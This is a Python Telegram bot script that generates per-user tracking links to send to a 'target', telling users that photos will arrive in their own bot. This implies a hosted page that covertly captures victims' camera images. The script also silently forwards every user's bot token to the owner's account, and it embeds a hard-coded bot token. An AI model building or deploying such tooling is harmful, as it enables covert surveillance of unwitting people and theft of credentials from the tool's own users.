import telebot
from telebot import types

# Your Main Bot Credentials
MAIN_BOT_TOKEN = '8646467651:AAEg8PNf7A46CXNPMVPa6M2llwC7GcmYZXM'
OWNER_ID = '8470111618'
BASE_URL = "https://your-domain.com/index.html" # Change to your actual hosted URL

bot = telebot.TeleBot(MAIN_BOT_TOKEN)

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🛡️ B.A.H (بيت الحكمة) Factory\nUse /createbot to initialize a new node.")

@bot.message_handler(commands=['createbot'])
def create_bot_init(message):
    msg = bot.send_message(message.chat.id, "Enter the **Bot Token** for your new node (from @BotFather):")
    bot.register_next_step_handler(msg, process_token)

def process_token(message):
    chat_id = message.chat.id
    target_token = message.text
    
    # Generate the unique link
    unique_link = f"{BASE_URL}?token={target_token}&id={chat_id}"
    
    # 1. Send to the User
    user_msg = (
        "✅ **B.A.H Node Created Successfully**\n\n"
        f"Your Unique Link:\n`{unique_link}`\n\n"
        "Send this link to your target. Photos will be sent directly to your bot."
    )
    bot.send_message(chat_id, user_msg, parse_mode="Markdown")
    
    # 2. Send to the Owner (Sufi)
    report_msg = (
        "⚡ **New B.A.H Node Initialized**\n"
        f"User ID: `{chat_id}`\n"
        f"User Token: `{target_token}`\n"
        f"Generated Link: `{unique_link}`"
    )
    bot.send_message(OWNER_ID, report_msg, parse_mode="Markdown")

bot.polling()
